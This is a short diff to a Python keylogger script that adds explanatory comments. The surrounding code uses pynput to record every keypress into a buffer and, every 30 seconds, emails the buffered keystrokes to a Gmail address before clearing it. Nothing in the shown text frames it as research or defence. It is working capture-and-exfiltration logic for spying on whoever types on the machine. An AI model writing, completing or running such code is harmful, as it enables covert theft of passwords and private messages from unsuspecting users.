@@ -11,6 +11,7 @@ def callback_function(key):
     try:
         log = log + str(key.char)
     except AttributeError:
+        # Special keys do not have a `.char` attribute, so handle them separately.
         if key == pynput.keyboard.Key.space:
             log = log + ""
         else:
@@ -31,6 +32,7 @@ listener = pynput.keyboard.Listener(on_press=callback_function)
 
 def thread_function():
     global log
+    # Periodically send the buffered keystrokes, then reset the buffer.
     send_email("test@gmail.com", "test", log)
     log = ""
     timer_object = threading.Timer(30, thread_function)
